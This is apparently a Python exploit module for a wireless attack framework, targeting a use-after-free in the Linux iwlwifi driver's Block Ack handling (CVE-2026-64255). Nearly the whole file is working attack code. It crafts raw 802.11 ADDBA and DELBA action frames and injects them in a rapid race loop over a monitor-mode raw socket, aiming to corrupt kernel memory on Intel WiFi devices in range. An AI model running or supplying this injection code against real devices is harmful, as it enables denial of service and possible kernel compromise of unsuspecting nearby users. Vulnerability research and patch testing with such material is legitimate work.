# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Intel iwlwifi Use-After-Free in Block Ack Handlers (CVE-2026-64255).

    The iwlwifi driver in the Linux kernel contains a use-after-free
    vulnerability in the Block Ack (BA) session management code.  When
    processing a rapid sequence of ADDBA/DELBA action frames, the driver
    frees the BA session structure but retains a stale pointer that is
    later dereferenced during RX reorder processing.  An attacker within
    WiFi range can trigger the UAF by sending interleaved ADDBA Request
    and DELBA frames, corrupting kernel memory for potential code
    execution.

    CVSS v3.1: ~7.8 (High), AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Intel iwlwifi UAF in Block Ack Handlers (CVE-2026-64255)",
        "description": (
            "Exploits CVE-2026-64255, a use-after-free in the iwlwifi "
            "Block Ack session management.  Rapid ADDBA/DELBA frame "
            "sequences cause the driver to free the BA session struct "
            "while a stale pointer remains in the RX reorder path.  "
            "Subsequent frame reception dereferences the freed memory, "
            "leading to kernel heap corruption."
        ),
        "authors": (
            "Linux kernel security team (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-64255",
            "https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/",
        ),
        "disclosure_date": "2026-05-15",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernels with iwlwifi (vulnerable versions)",
            "Intel AX200, AX201, AX210, AX211, BE200",
            "Ubuntu 22.04/24.04, Fedora, Arch (unpatched)",
        ),
    }

    target = OptIP("", "Target station MAC address")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    tid = OptInteger(0, "TID for Block Ack session (0-7)")
    race_rounds = OptInteger(128, "Number of ADDBA/DELBA race rounds")
    inter_frame_delay = OptFloat(0.001, "Delay between frames in seconds")

    _FRAME_TYPE_MGMT = 0x00
    _SUBTYPE_ACTION = 0x0D
    _SUBTYPE_PROBE_REQ = 0x04

    _ACTION_CATEGORY_BA = 3
    _ACTION_ADDBA_REQUEST = 0
    _ACTION_ADDBA_RESPONSE = 1
    _ACTION_DELBA = 2

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_SRC = b"\x02\x00\x00\x00\x00\x01"
    _FAKE_BSSID = b"\x02\x00\x00\x00\x00\x02"

    def _build_radiotap_header(self) -> bytes:
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_frame_control(self, subtype: int) -> bytes:
        fc = (self._FRAME_TYPE_MGMT & 0x03) | ((subtype & 0x0F) << 4)
        return struct.pack("<BB", fc, 0x00)

    def _build_addba_request(self, src: bytes, dst: bytes, dialog: int) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_ACTION)
        duration = struct.pack("<H", 0)
        seq_ctrl = struct.pack("<H", (dialog & 0x0FFF) << 4)
        header = fc + duration + dst + src + self._FAKE_BSSID + seq_ctrl

        category = struct.pack("B", self._ACTION_CATEGORY_BA)
        action = struct.pack("B", self._ACTION_ADDBA_REQUEST)
        dialog_token = struct.pack("B", dialog & 0xFF)
        ba_param = ((self.tid & 0x0F) << 2) | (64 << 6) | 0x0002
        ba_param_set = struct.pack("<H", ba_param)
        ba_timeout = struct.pack("<H", 0)
        ba_ssn = struct.pack("<H", 0)

        body = category + action + dialog_token + ba_param_set + ba_timeout + ba_ssn
        radiotap = self._build_radiotap_header()
        return radiotap + header + body

    def _build_delba(self, src: bytes, dst: bytes) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_ACTION)
        duration = struct.pack("<H", 0)
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + self._FAKE_BSSID + seq_ctrl

        category = struct.pack("B", self._ACTION_CATEGORY_BA)
        action = struct.pack("B", self._ACTION_DELBA)
        delba_param = struct.pack("<H", ((self.tid & 0x0F) << 12) | 0x0800)
        reason = struct.pack("<H", 37)

        body = category + action + delba_param + reason
        radiotap = self._build_radiotap_header()
        return radiotap + header + body

    def _build_probe_request(self) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_PROBE_REQ)
        duration = struct.pack("<H", 0)
        dst = self._BROADCAST
        src = self._FAKE_SRC
        bssid = self._BROADCAST
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + bssid + seq_ctrl
        ssid_ie = struct.pack("BB", 0, 0)
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x02, 0x04, 0x0B, 0x16])
        radiotap = self._build_radiotap_header()
        return radiotap + header + ssid_ie + rates_ie

    def _inject_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
        try:
            raw_sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return
        if not self.check():
            print_error("Cannot open raw socket on monitor interface")
            return
        print_success("Monitor-mode socket established; triggering BA UAF race")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        src = self._FAKE_SRC
        dst = self._BROADCAST

        print_status(
            f"Injecting {self.race_rounds} ADDBA/DELBA race pairs "
            f"on TID {self.tid}"
        )

        success = 0
        for rnd in range(self.race_rounds):
            addba = self._build_addba_request(src, dst, rnd)
            delba = self._build_delba(src, dst)

            if self._inject_frame(raw, addba):
                success += 1
            if self.inter_frame_delay > 0:
                time.sleep(self.inter_frame_delay)
            if self._inject_frame(raw, delba):
                success += 1
            if self.inter_frame_delay > 0:
                time.sleep(self.inter_frame_delay)

        raw.close()

        print_status(f"Injected {success} frames across {self.race_rounds} rounds")
        print_info(
            "The rapid ADDBA/DELBA sequence targets the race window "
            "where the BA session struct is freed but the RX reorder "
            "path still holds a pointer.  Monitor the target for "
            "kernel oops, KASAN reports, or unexpected behavior."
        )
